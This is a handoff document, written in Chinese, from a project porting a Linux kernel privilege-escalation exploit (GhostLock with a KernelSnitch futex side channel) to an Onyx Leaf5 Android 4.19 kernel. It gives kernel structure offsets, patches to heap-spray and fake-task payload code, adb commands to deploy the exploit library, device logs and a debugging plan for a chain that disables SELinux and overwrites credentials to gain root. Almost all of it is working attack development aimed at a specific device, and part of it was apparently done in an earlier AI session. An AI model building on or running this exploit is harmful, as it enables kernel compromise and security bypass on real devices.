# Leaf5 GhostLock 适配 — 轮次交接文档

> 继 grok session 019f92aa-73b8-7c11-8a30-7713b7835e0d 的 offset 定位与 exploit 适配工作。

## 状态总览

| 阶段 | 状态 |
|------|------|
| boot_a.bin 提取并确认为 runtime 内核 | ✅ |
| vmlinux-to-elf 重建符号表 (121883 symbols) | ✅ |
| target.h 编写 (符号/结构体偏移) | ✅ |
| CI 编译通过 | ✅ |
| preload 在设备上成功启动 | ✅ |
| 碰撞探测 (15 collisions) | ✅ |
| mm_struct 扫描 (bruteforce) | ⚠️ 修复中，待重新测试 |
| 后续利用链 (sk_buff reclaim→pipe physrw→root) | ❓ 未到达 |

## 关键偏移定位方法

不依赖 IDA/pahole，从以下数据源交叉验证：

| 数据源 | 文件 | 用途 |
|--------|------|------|
| 设备 `/proc/config.gz` | `raw/config.gz` | CONFIG 真值 |
| 设备 `/sys/kernel/kheaders.tar.xz` | `raw/kheaders/` | 结构体字段存在性 |
| boot_a.bin → vmlinux.elf | `raw/vmlinux.elf` | 符号表 + capstone 反汇编 |
| capstone 5.0 反汇编 | 关键函数 | 字段偏移 (LDR/STR 指令分析) |

可复用工具：

```bash
cd leaf5
uv sync
uv run leaf5-extract-offsets    # 提取符号 + 结构体偏移
uv run leaf5-mm-params           # 提取 MM_STRUCT_SZ + MM_ORDER
```

## 4.19 vs 5.10 差异清单

### 已确认差异（已应用到 target.h）

| 维度 | 4.19 (Leaf5) | 5.10 (OPPO) | 影响 |
|------|-------------|------------|------|
| `rt_mutex_waiter` sizeof | **0x40** | 0x50 | waiter 布局不含 prio/deadline |
| `task_struct.real_cred` | **0x7d8** | 0x818 | cred 覆写偏移 |
| `task_struct.cred` | **0x7e0** | 0x820 | cred 覆写偏移 |
| `task_struct.pi_blocked_on` | **0x8d0** | 0x898 | pi 链操作 |
| `pipe_inode_info.head` | **0x38** | 0x60 | pipe 结构访问 |
| `pipe_inode_info.bufs` | **0x78** | 0xa8 | pipe buffer 访问 |
| `mm_struct.owner` | **0x328** | 0x408 | mm owner 覆写 |
| `MM_STRUCT_SZ` | **0x388** (904B) | 0x3c0 (960B) | mm_struct 扫描步长 |
| `futex_wait_requeue_pi` 符号 | ❌ 不存在 | 存在 | do_futex 内联处理 |
| `configfs_read_iter` | `configfs_read_file` | `configfs_read_iter` | configfs 函数名 |
| `selinux_enforcing` | `selinux_enforcing_boot` | `selinux_enforcing` | SELinux 变量名 |
| `SELINUX_BLOB_SIZES` | ❌ 4.19 无此结构 (5.1引入) | 存在 | root.c 中用 `#if` 跳过 |
| 内核 CFI | ❌ 无 | 有 (强 CFI) | 攻击面更宽 |
| KPTI | ❌ 无 | 有 | 无 trampoline 开销 |

### 确认一致（无需调整）

| 维度 | 说明 |
|------|------|
| `futex_key_t` 布局 | Android 4.19 = 5.10：`mm(+0), address(+8), offset(+16)` |
| FUTEX opcode 值 | `FUTEX_WAIT_REQUEUE_PI=11`, `FUTEX_CMP_REQUEUE_PI=12` |
| kmalloc cache 索引 | `CGROUP_TYPE=2` 在 CONFIG_MEMCG_KMEM=y 下一致 |
| rbtree/plist | 布局相同 |
| fops struct | 偏移相同 |

### ⚠️ 待验证

| 项目 | 说明 |
|------|------|
| `SKB_DATA_DELTA = -0xe80` | 4.19 的 sk_buff 布局可能不同，可通过 `SLIDE_SKB_DATA_DELTA` 环境变量覆盖 |
| UCLAMP 偏移 | CONFIG_UCLAMP_TASK=n，fake task 中 UCLAMP 字段不存在，是否影响 heap spray 待定 |

## Bruteforce 三重 Bug 修复

mm_struct 扫描失败，根因是三个独立的 Bug，全部已修复：

### Bug #1 — MM_STRUCT_SZ 为 5.10 值 (0x3c0)

**症状**：扫描刷屏 `tested N candidates`，永远不 `found`

**原因**：`common.h` 中 `MM_STRUCT_SZ=0x3c0` (960B) 是 OPPO 5.10 的。Leaf5 4.19 实际 `sizeof(mm_struct)=0x388` (904B)。`fork_init` 反汇编中 `kmem_cache_create_usercopy` 的 `w1=0x388`，`mm_alloc` 的 `memset(mm, 0, 0x380)` 交叉验证。

**修复**：移到 target.h per-target 定义，Leaf5=`0x388`。

### Bug #2 — futex_hash 对地址做了页对齐

**症状**：碰撞探测成功（15个），bruteforce 扫描全部 candidate 但一个都没匹配上

**原因**：`futex_hash(addr, mm)` 中 `key.private.address = addr & ~0xfff` 把地址低 12 位清零了。但内核 `get_futex_key` 存的是完整地址（反汇编确认：`sub x20, x0, #0` → 值未变）。hash 输入不同 → hash 值不同 → 匹配失败。

**修复**：`key.private.address = addr`（完整地址），`key.private.offset = addr & 0xfff`。

### Bug #3 — futex_hashsize 用了错误 CPU 数

**症状**：同 Bug #2，碰撞探测过但 bruteforce 不过

**原因**：`sysconf(_SC_NPROCESSORS_ONLN)` 返回 16（可能与 SMT 相关），但内核 `num_possible_cpus()` = 8（`/sys/devices/system/cpu/possible: 0-7`）。futex_hashsize = 4096 vs 2048，`hash & (N-1)` 截断到不同桶号。

**修复**：`futex_init()` 改为从 `/sys/devices/system/cpu/possible` 读取真实值，fallback 到 target.h 定义。

## 文件变更清单

```
exploit/targets/onyx-leaf5/target.h   新建 — Leaf5 完整目标定义
exploit/targets/oppo-find_n2/target.h 修改 — 添加 MM_STRUCT_SZ/ORDER, SELINUX_USE_BLOB_SIZES
exploit/src/common.h                  修改 — MM_STRUCT_SZ/ORDER 改为 #ifndef 守卫
exploit/src/root.c                    修改 — SELINUX_USE_BLOB_SIZES 条件编译
exploit/src/kernelsnitch/futex_hash.h 修改 — 完整地址 + sysfs CPU 读取
exploit/Makefile                      修改 — 跨平台支持 + TARGET_DIR 参数
.github/workflows/build-exploit.yml   新建 — CI 自动编译 onyx-leaf5
leaf5/scripts/extract_offsets.py      新建 — 可复用偏移提取工具
leaf5/scripts/extract_mm_struct_params.py 新建 — MM_STRUCT_SZ/ORDER 提取
leaf5/STACK_LAYOUT.md                 新建 — 栈帧布局分析
leaf5/HANDOFF.md                      新建 — 本文件
```

## 部署与执行

```bash
# 从 CI 下载
gh run download <run-id> -n preload-onyx-leaf5 -D /tmp/art

# 推送执行
adb push /tmp/art/preload.so /data/local/tmp/
adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/ls /dev/null'

# 调试用环境变量
SLIDE_SKB_DATA_DELTA=-0xe00    # 如果 sk_buff reclaim 阶段失败，调此值
```

## 未完成项

1. **Bruteforce 重新测试** — 三重 Bug 修复后是否通过
2. **后续利用链** — sk_buff reclaim → pipe physrw → fops overwrite → selinux disable → root
3. **[SRC]/[EST] 偏移验证** — `TASK_PID_OFF`, `TASK_TASKS_OFF` 等标记为估计值的需 pahole/IDA 复核
4. **SKB_DATA_DELTA 实测** — 是否需要调整
5. **NDK 编译 futex 烟雾测试** — `FUTEX_WAIT_REQUEUE_PI` / `CMP_REQUEUE_PI` 返回值确认

---

## 10. 深度问题分析 — 为什么还不行（2026-07-24 二轮分析）

基于对 exploit 全部源码（main.c, util.c, fops.c, heap_spray.c, pipe.c, root.c, preload.c, kernelsnitch/, futex_hash.h）的逐文件审查，识别出以下 **尚未修复的问题**，按风险等级排列。

### 🔴 P0 — 必定导致失败

#### P0-1: heap_spray.c 硬编码了 OPPO 5.10 偏移

**文件**: `exploit/src/heap_spray.c:19-20`

```c
#define FAKE_WAITER_SIZE 0x50  /* OPPO 5.10 值，4.19 应为 0x40 */
#define PI_BLOCKED_ON_OFF 0x898 /* OPPO 5.10 值，4.19 应为 0x8d0 */
```

| 常量 | 当前值 | 应为 (Leaf5 4.19) | 差异 |
|------|--------|-------------------|------|
| `FAKE_WAITER_SIZE` | `0x50` (80B) | `0x40` (64B) | 多写 16B，破坏相邻堆数据 |
| `PI_BLOCKED_ON_OFF` | `0x898` | `0x8d0` | 差 56B，写到 task_struct 的错误字段 |

**影响**: `redirect_pi_blocked_on()` 会把 `pi_blocked_on` 重定向写到 `task_struct+0x898` 而非 `task_struct+0x8d0`，pi 链重定向完全无效。fake_waiter 写入多出 16 字节破坏相邻内存。

**修复方向**: 改为使用 target.h 中的 `TASK_PI_BLOCKED_ON_OFF` 和 `WAITER_LOCAL_OFF`，删除硬编码。

#### P0-2: util.c 中 -1 偏移写入

**文件**: `exploit/src/util.c:492-507` (`put_p9_fops_waiter`)

```c
put32(p, W0_OFF + WAITER_WAKE_STATE_OFF, 0);  // WAITER_WAKE_STATE_OFF = -1
put32(p, W0_OFF + WAITER_PRIO_OFF, FAKE_WAITER_PRIO);  // WAITER_PRIO_OFF = -1
put64(p, W0_OFF + WAITER_DEADLINE_OFF, 0);   // WAITER_DEADLINE_OFF = -1
put64(p, W0_OFF + WAITER_WW_CTX_OFF, 0);     // WAITER_WW_CTX_OFF = -1
```

这些写入目标为 `W0_OFF - 1`（即 `0x221F`），会破坏 fake waiter 前一个字节到前 8 个字节。对于 4.19，这些字段不存在，应当用 `#if` 保护跳过写入。

**修复方向**: 用 `#if WAITER_PRIO_OFF >= 0` 等预处理器条件保护，或在 4.19 target 中将它们设为 0 并接受对 offset 0 的无害写入。

### 🟠 P1 — 很可能导致失败

#### P1-1: CRED_SECURITY_OFF = 0x80 未经验证

**文件**: `exploit/targets/onyx-leaf5/target.h:261-265`

```c
#define CRED_SECURITY_OFF 0x80  /* [EST] void *security — NEEDS verification */
```

target.h 自身注释警告：在 4.19 中 `cred+0x80` 可能是 `session_keyring` 而非 `security` 指针。`security` 字段在 keyring 指针之后。如果此偏移错误：

1. `root.c:patch_cred_sid()` 会读到一个 keyring 指针当 security blob 用
2. 写入 kernel SID 到错误地址 → **内核崩溃**或静默失败
3. SELinux 上下文无法绕过 → root 不完整

**验证方法**:
- 反汇编 `selinux_cred_alloc_blank` 或 `cred_init_security`，找写入 `cred->security` 的偏移
- 或在 vmlinux.elf 中查找 `selinux_cred_free` 中对 `cred->security` 的访问

```bash
# 从符号表获取 cred 相关函数地址
uv run leaf5-extract-offsets --symbol selinux_cred
# 反汇编安全 blob 访问函数验证偏移
```

#### P1-2: pselect fd_set 与 waiter 栈帧重叠未验证

**文件**: `exploit/targets/onyx-leaf5/target.h:406`

```c
#define PSELECT_WAITER_WORD_SHIFT 0  /* [EST] default — adjust after stack analysis */
```

**文件**: `exploit/src/fops.c:144-166` (prepare_pselect_fdsets)

pselect fd_set 的 word 索引直接决定哪些字节覆盖 waiter 的哪些字段。如果 4.19 的 futex_wait 栈帧（0x140）与 pselect 栈帧（取决于编译器和 syscall 实现）的相对偏移不同于 5.10，word 到 waiter 字段的映射就全错了。

**验证方法**:
1. 反汇编 `__arm64_sys_pselect6` 确认其栈帧大小和 fd_set copy 位置
2. 结合 `STACK_LAYOUT.md` 中已知的 waiter 位置（`futex_wait sp+0x80`）
3. 计算从 pselect 栈底到 waiter 地址的偏移
4. 确认 fd_set 中哪些 word 对齐到 `tree_entry.__rb_parent_color`、`pi_tree_entry.__rb_parent_color`、`task`、`lock` 等字段

#### P1-3: futex_key 布局虽然反汇编确认但需运行时验证

**文件**: `exploit/src/kernelsnitch/futex_hash.h:260-268`

虽然 capstone 反汇编显示 `stp x22(mm), x20(addr), [x19]`（mm 在 +0，addr 在 +8），但这与 mainline 4.19 源码不同（mainline 是 addr 在 +0，mm 在 +8）。可能是 Android 4.19 的反向移植，但必须在设备上验证。

**验证方法**: 编写最小 NDK 探针（见 P2-1），验证同一 mm+addr 对在用户态和内核态产生的 futex hash 是否一致。碰撞探测的 15 个碰撞可以部分验证，但不能排除"巧合匹配"。

### 🟡 P2 — 可能导致阶段性失败

#### P2-1: 多个 [EST] 偏移未验证

| 偏移 | 当前值 | 用途 | 失败后果 |
|------|--------|------|----------|
| `TASK_PID_OFF` | `0x5f8` | 进程 PID 读取 | 任务遍历找不到目标进程 |
| `TASK_TGID_OFF` | `0x5fc` | 进程 TGID 读取 | `find_task_by_tgid` 失败 |
| `TASK_TASKS_OFF` | `0x530` | task list 遍历 | 任务链表遍历失败 |
| `TASK_PI_WAITERS_OFF` | `0x8b8` | pi_waiters rb_root | fake task 中 pi_waiters 位置错误 |
| `TASK_SECCOMP_OFF` | `0x8e8` | seccomp 绕过 | seccomp 未被正确清除 |
| `FAKE_TASK_PI_LOCK_OFF` | `0x8a0` | fake task 的 pi_lock | PI 链操作可能失败 |
| `FAKE_TASK_PI_TOP_TASK_OFF` | `0x8c0` | fake task 的 pi_top_task | PI 优先级继承错误 |
| `FAKE_TASK_NORMAL_PRIO_OFF` | `0xb4` | fake task 的 normal_prio | 调度相关，影响较小 |

**验证方法**:
```bash
# 反汇编更多函数获取这些字段的访问指令
uv run leaf5-extract-offsets --func find_task_by_vpid
uv run leaf5-extract-offsets --func prctl_set_seccomp
uv run leaf5-extract-offsets --func rt_mutex_adjust_prio_chain
```

#### P2-2: SKB_DATA_DELTA 可能不对

**文件**: `exploit/src/common.h:46`

```c
#define SKB_DATA_DELTA (-0xe80LL)
```

这个值表示从 order-3 slab page 基址到 sk_buff 数据 payload 起始的偏移。4.19 的 `sk_buff` 结构体布局可能与 5.10 不同：
- `sk_buff` 头部大小（含 cb, headers, data 指针等）
- `skb_shared_info` 位置
- data 对齐策略

环境变量 `SLIDE_SKB_DATA_DELTA` 可运行时覆盖，但默认值来自 OPPO。

**验证方法**:
- 反汇编 `__alloc_skb` 或 `skb_alloc`，追踪 data 指针初始化
- 或在设备上通过 KernelSnitch 先确认 mm_struct 泄露成功，然后调整 delta 直到 sk_buff reclaim 后的 payload 正确覆盖目标页面

#### P2-3: CONFIG_UCLAMP_TASK=n 但 fake task 仍写入 UCLAMP 字段

**文件**: `exploit/src/util.c:627-634`

```c
put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_REQ_OFF, FAKE_UCLAMP_MIN_ACTIVE);
put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_REQ_OFF + 0x04, FAKE_UCLAMP_MAX_ACTIVE);
put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_OFF, FAKE_UCLAMP_MIN_ACTIVE);
put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_OFF + 0x04, FAKE_UCLAMP_MAX_ACTIVE);
```

`FAKE_TASK_UCLAMP_REQ_OFF = 0x350`，`FAKE_TASK_UCLAMP_OFF = 0x358`。在 `CONFIG_UCLAMP_TASK=n` 时，这些偏移对应 task_struct 中完全不同的字段。写入这些值可能：
- 无害（如果是 padding）
- 有害（如果覆盖了关键字段）

**风险评估**: 相对较低，因为这是 FAKE task struct（攻击者控制的 payload 页面），不是真实 task_struct。但如果 fake task 中的这些偏移恰好与其他被内核读取的字段重叠，就会出问题。

#### P2-4: 地址空间假设 — direct map base 是否被随机化

**文件**: `exploit/src/main.c:237-239`

```c
kaslr_base = P0_PAGE_OFFSET + P0_KERNEL_PHYS_LOAD;
kaslr_slide = 0;
```

假设：
1. `P0_PAGE_OFFSET = 0xffffff8000000000` — direct map 基址未被 KASLR 随机化
2. `P0_KERNEL_PHYS_LOAD = 0x80080000` — 内核物理加载地址已知

在 ARM64 4.19 上，这两个值很可能正确（direct map 通常不随 KASLR 变化），但需确认。如果 direct map 基址也被随机化，则所有 `data_addr()` 计算出的地址都错。

#### P2-5: direct map 可能不可执行 (PXN)

即使 fops 表中的函数指针使用 `text_addr()` 计算出 direct-map 别名，ARM64 的 direct map 通常配置为 **非可执行** (PXN=1)。当内核尝试通过 fops 调用这些函数指针时，会因为执行权限缺失而 panic。

不过这在 OPPO 5.10 上已成功，说明要么:
- 这些设备的 direct map 确实可执行
- 攻击路径不经过 direct map 的函数调用（而是通过其他机制）

**验证**: 检查 `/sys/kernel/debug/kernel_page_tables`（若可见）或确认 OPPO 设备的成功路径。

### 🟢 P3 — 优化/次要问题

#### P3-1: target.h 的 CFG_* 偏移直接继承自 OPPO

```c
#define LOCK_OFF  0x1350  /* [SRC] from oppo template — adjust for 4.19 */
#define W0_OFF    0x2220  /* [SRC] */
#define FOPS_OFF  0x1000  /* [SRC] */
// ...
```

这些 "page-level constants" 标记为 `[SRC] from oppo template`，需要针对 4.19 的 sk_buff data 布局重新计算。

#### P3-2: 4.19 缺少 futex_wait_requeue_pi 符号

4.19 的 `FUTEX_WAIT_REQUEUE_PI` 在 `do_futex` 中内联处理，不走独立函数。这意味着 exploit 中对特定符号的引用（如符号表中的 futex 相关偏移）必须适配。

#### P3-3: 释放后未清理的资源

`prepare_kernel_page` 中多个子进程和 memfd 的清理路径有多处 early return，可能导致资源泄漏，但不影响单次 exploit 尝试的正确性。

---

## 11. 推荐的分析/调试步骤（优先级排序）

### Step 1: 修复 P0 问题（必定失败）

- [ ] **P0-1**: heap_spray.c 改用 target.h 的 `TASK_PI_BLOCKED_ON_OFF` 和 `WAITER_LOCAL_OFF`
- [ ] **P0-2**: put_p9_fops_waiter 和 SLIDE payload 中的 -1 偏移写入加 `#if >= 0` 守卫

### Step 2: 验证 P1 问题（高概率失败）

- [ ] **P1-1**: 反汇编 `selinux_cred_alloc_blank` / `cred_init_security` 确认 `CRED_SECURITY_OFF`
- [ ] **P1-2**: 反汇编 `__arm64_sys_pselect6`，计算 fd_set 栈位置与 waiter 位置的相对偏移，更新 `PSELECT_WAITER_WORD_SHIFT`
- [ ] **P1-3**: 编写 NDK futex 探针，在设备上多次比对 hash 值

### Step 3: 交叉验证 P2 偏移

- [ ] 用 capstone 反汇编更多函数，将 `[EST]` 偏移升级为 `[BIN]`
- [ ] 或使用 pahole（若有匹配的 DWARF 信息）
- [ ] 重点: `TASK_PID_OFF`, `TASK_TGID_OFF`, `TASK_TASKS_OFF`, `TASK_SECCOMP_OFF`

### Step 4: 设备上分阶段测试

- [ ] **阶段 A**: 仅运行 KernelSnitch 碰撞探测 + bruteforce，确认 mm_struct 泄露成功
- [ ] **阶段 B**: 确认 sk_buff reclaim 后 payload 正确放置（加日志输出 payload 关键偏移的值）
- [ ] **阶段 C**: 仅触发 GhostLock + pselect，不执行后续利用，检查内核是否 panic
- [ ] **阶段 D**: 完整利用链

### Step 5: 动态调参

- [ ] 如果 sk_buff reclaim 失败，调整 `SKB_DATA_DELTA`（通过环境变量 `SLIDE_SKB_DATA_DELTA`）
- [ ] 如果 pselect 栈覆盖失败，调整 `PSELECT_WAITER_WORD_SHIFT`
- [ ] 如果 pipe physrw 失败，检查 pipe 偏移和 slab 布局

---

## 12. 快速修复补丁（P0 问题）

### 修复 P0-1 (heap_spray.c)

```diff
- #define FAKE_WAITER_SIZE 0x50
- #define PI_BLOCKED_ON_OFF 0x898
+ #define FAKE_WAITER_SIZE WAITER_LOCAL_OFF
+ #define PI_BLOCKED_ON_OFF TASK_PI_BLOCKED_ON_OFF
```

同时 `struct fake_waiter` 中的 `prio` (offset 0x40) 和 `deadline` (offset 0x48) 字段需要用 `#if WAITER_PRIO_OFF >= 0` 条件编译保护。

### 修复 P0-2 (util.c)

```diff
- put32(p, W0_OFF + WAITER_WAKE_STATE_OFF, 0);
- put32(p, W0_OFF + WAITER_PRIO_OFF, FAKE_WAITER_PRIO);
- put64(p, W0_OFF + WAITER_DEADLINE_OFF, 0);
- put64(p, W0_OFF + WAITER_WW_CTX_OFF, 0);
+ #if WAITER_WAKE_STATE_OFF >= 0
+   put32(p, W0_OFF + WAITER_WAKE_STATE_OFF, 0);
+ #endif
+ #if WAITER_PRIO_OFF >= 0
+   put32(p, W0_OFF + WAITER_PRIO_OFF, FAKE_WAITER_PRIO);
+ #endif
+ #if WAITER_DEADLINE_OFF >= 0
+   put64(p, W0_OFF + WAITER_DEADLINE_OFF, 0);
+ #endif
+ #if WAITER_WW_CTX_OFF >= 0
+   put64(p, W0_OFF + WAITER_WW_CTX_OFF, 0);
+ #endif
```

同样处理 SLIDE payload 中的 `FAKE_WAITER_*_OFF` 写入（util.c:613,617,620-621）。

---

## 13. 设备实测分析（2026-07-24 运行时输出）

从 Leaf5 真机运行 preload.so 的实际输出：

```
[*] pile-up verified: approx_time=1742
[*] start finding collisisons
[*] target    0000007c12a930c8
[*]   000000692046b880
[*]   00000069217921b8
[*]   0000006921d6e098
[*]   00000069236115b0
...
[*] [  3] tested 38797312 candidates, scanning=0xffffff9ff04e4318
[*] [  3] thread done, tested 38797312 candidates
[-] KernelSnitch mm_struct leak failed
[-] prepare_kernel_page retry 6/72
```

### 关键发现

| 阶段 | 状态 | 机制 |
|------|------|------|
| 碰撞探测 (15 collisions) | ✅ | **时序**侧信道，不依赖用户态 hash |
| Bruteforce (38.7M × 8 threads ≈ 310M 候选) | ❌ | **计算** `futex_hash(addr, candidate)`，依赖用户态 hash ≡ 内核态 hash |

**碰撞探测成功但 bruteforce 失败 = 用户态 hash 函数与内核不一致！**

### 根因推断：futex_key 布局错误

`target.h` 声称 Android 4.19 使用 non-V1 布局（mm+0, addr+8），依据是 capstone 反汇编中的 `stp x22(mm), x20(addr), [x19]` 指令。

但 **mainline 4.19 源使用 V1 布局**（addr+0, mm+8）。如果 capstone 分析中对 x22/x20 的赋值追踪有误，实际内核仍为 V1 布局，则：

| 布局 | bytes 0-7 | bytes 8-15 | jhash2 输入 |
|------|-----------|------------|-------------|
| V1（内核实际?）| address | mm | `{addr, mm}` |
| non-V1（代码假定）| mm | address | `{mm, addr}` |

→ jhash2 输入顺序交换 → hash 值完全不同 → bruteforce 永远匹配不到

### 验证方案

**最快验证**：编译两个版本，分别测试：

```bash
# 版本 A: 强制启用 V1 布局
make ... CFLAGS="-DFUTEX_KEY_LAYOUT_V1"

# 版本 B: 当前代码（non-V1）
make ...
```

如果版本 A 的 bruteforce 通过，则确认是布局问题。

**精确验证**：编写 NDK 最小探针，在内核态和用户态对同一 `(addr, mm)` 对计算 hash，比对结果。这需要：
1. 一个已知的 mm_struct 地址（可通过 `/proc/self/stat` 的 `startstack` 附近推算）
2. 在用户态用两种布局分别计算 hash
3. 通过 KernelSnitch 时序确认哪个 hash 与内核一致

### 影响评估

如果确认是 V1 布局问题：
- **futex_hash.h** 中需启用 `FUTEX_KEY_LAYOUT_V1`
- **futex_hash()** 函数中字段赋值顺序需调整（V1: address 先，mm 后）
- target.h 中的非 V1 相关注释需更正
- 这是一个**一行修复**（加 `-DFUTEX_KEY_LAYOUT_V1` 编译选项）

---

## 14. 诊断结果确认（2026-07-24 设备实测）

### 诊断输出

```
DIAG: best match 4/16 at 0xffffffa86b13d848
DIAG: dump hashes for best candidate (futex_addrs[0]=0x7a24ddb0c8):
  addr[0]=0x7a24ddb0c8 hash=0x30d
  addr[1]=0x67341968d0 hash=0x2c5
  addr[2]=0x6734cd12a8 hash=0x45f
  addr[3]=0x6734dcda88 hash=0x30d  ← 仅 addr[0] 和 addr[3] 偶然碰撞
  addr[4]=0x6735659ee8 hash=0x196
  addr[5]=0x6735a85048 hash=0x236
  addr[6]=0x6735b8c880 hash=0x194
  addr[7]=0x6735f3e610 hash=0x2bc
```

### 统计分析

- best_match = 4/16：在 2048 槽的 hash 表中，4 个随机地址碰同一 bucket 的概率 ≈ 2.1×10⁻⁷
- × 38.8M 候选 ≈ **期望 ~8 个候选达到 4/16**（纯随机偶然）
- 5/16 的概率 ≈ 2.5×10⁻¹⁰ × 38.8M ≈ 0.01（几乎不可能随机出现）
- **未观察到任何 ≥5/16 的候选** → 用户态 hash 与内核零相关

### 结论

✅ **确认为 futex_key 布局错误**。内核使用 V1 布局（addr+0, mm+8），但 exploit 使用 non-V1（mm+0, addr+8）。碰撞探测成功是因为它用时序而非 hash，bruteforce 失败是因为用户态 hash 输入字节顺序与内核相反。

### 已应用的修复

1. **Makefile**: 添加 `-DFUTEX_KEY_LAYOUT_V1` 编译标志
2. **target.h**: 更正注释，标记 V1 为必需
3. **kernelsnitch.h**: 保留诊断代码以验证修复效果

### 下一步

```bash
cd exploit && make TARGET_DIR=onyx-leaf5
adb push preload.so /data/local/tmp/
adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/ls /dev/null'
```

**期望结果**: best_match 从 4/16 → 16/16，bruteforce 找到 mm_struct，输出变为 `found mm_struct 0xffffff8...`。

如果 best_match 仍然是 4/16，则说明内核的布局有其他变体，需要进一步分析（但概率极低）。
